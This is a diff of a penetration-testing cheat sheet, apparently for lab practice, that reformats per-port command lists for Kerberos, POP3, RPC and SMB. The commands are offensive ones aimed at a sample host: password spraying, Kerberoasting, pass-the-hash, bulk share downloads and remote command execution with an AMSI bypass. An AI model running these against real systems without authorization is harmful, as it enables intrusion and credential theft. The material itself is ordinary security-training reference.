@@ -50,44 +50,43 @@ $ nslookup 10.10.10.10
 	
 => Host
 $ host -t ns megacorpone.com
-
 ```
 
 ### 88 (Kerberos)
 
 ```bash
-# Nmap
+=> Nmap
 
 
-# Enumerate Users
-kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+=> Enumerate Users
+$ kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
-# Bruteforce User
-kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik
+=> Bruteforce User
+$ kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik
 
-# Passwword Spray
-kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'
+=> Passwword Spray
+$ kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'
 
-# Kerberoasting
-GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
--> 13100 hashcat mode
+=> Kerberoasting
+$ GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
+$ 13100 hashcat mode
 
-# bloodhound-python
-bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.local' -ns 10.10.10.10
-bloodhound-python -u 'nik' --hashes 'aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d' -d 'bank.local' -ns 10.10.10.10
+=> bloodhound-python
+$ bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.local' -ns 10.10.10.10
+$ bloodhound-python -u 'nik' --hashes 'aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d' -d 'bank.local' -ns 10.10.10.10
 ```
 
-### 110,995 (POP3)
+### Port 110 , 995 (POP3)
 
 ```bash
-# Nmap
+=> Nmap
 
-# Banner Grabbing
-nc -nv 10.10.10.10 110
-openssl s_client -connect 10.10.10.10:995 -crlf -quiet
+=> Banner Grabbing
+$ nc -nv 10.10.10.10 110
+$ openssl s_client -connect 10.10.10.10:995 -crlf -quiet
 
-# Connect
-telnet 10.10.10.10 110
+=> Connect
+$ telnet 10.10.10.10 110
 	* USER nik
 	* PASS Password@123!
 	* list
@@ -95,56 +94,56 @@ telnet 10.10.10.10 110
 	* quit
 ```
 
-### 135,593 (RPC)
+### Port 135 , 593 (RPC)
 
 ```bash
-# Nmap
+=> Nmap
 
-# Rpcclient
-rpcclient -U '' -N 10.10.10.10
+=> Rpcclient
+$ rpcclient -U '' -N 10.10.10.10
 
-# Rpcclient Commands
-- enumdomusers
-- netshareenum
-- netshareenumall
-- srvinfo
-- queryuser 500
-- querydispinfo
+=> Rpcclient Commands
+$ enumdomusers
+$ netshareenum
+$ netshareenumall
+$ srvinfo
+$ queryuser 500
+$ querydispinfo
 ```
 
 ### 139,445 (SMB)
 
 ```bash
-# Nmap
-nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
-nmap --script smb-vuln* -p 137,139,445 10.10.10.10
+=> Nmap
+$ nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
+$ nmap --script smb-vuln* -p 137,139,445 10.10.10.10
 
-# Smbmap
-smbmap -H 10.10.10.10
-smbmap -H 10.10.10.10 -u raj -p 123 
-smbmap -H 10.10.10.10 -P 139
+=> Smbmap
+$ smbmap -H 10.10.10.10
+$ smbmap -H 10.10.10.10 -u raj -p 123 
+$ smbmap -H 10.10.10.10 -P 139
 
-# Smbclient
-smbclient -L 10.10.10.10
-smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
-smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
-smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
-smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'
-smbclient -U 'nik' \\\\10.10.10.10\\Data -c  "get \Windows\test.txt" 'Password@123!' -t 10000
+=> Smbclient
+$ smbclient -L 10.10.10.10
+$ smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
+$ smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
+$ smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
+$ smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'
+$ smbclient -U 'nik' \\\\10.10.10.10\\Data -c  "get \Windows\test.txt" 'Password@123!' -t 10000
 
-# Smbget
-smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'
+=> Smbget
+$ smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'
 
-# Crackmapexec
-crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
-crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
-crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 
-crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
+=> Crackmapexec
+$ crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
+$ crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
+$ crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 
+$ crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 
-# Enum4linux
-enum4linux 10.10.10.10
-enum4linux -u "user" -p "password" -a 10.10.10.10
-for i in $(cat list.txt); do enum4linux -a $i;done
+=> Enum4linux
+$ enum4linux 10.10.10.10
+$ enum4linux -u "user" -p "password" -a 10.10.10.10
+$ for i in $(cat list.txt); do enum4linux -a $i;done
 
 ```
 
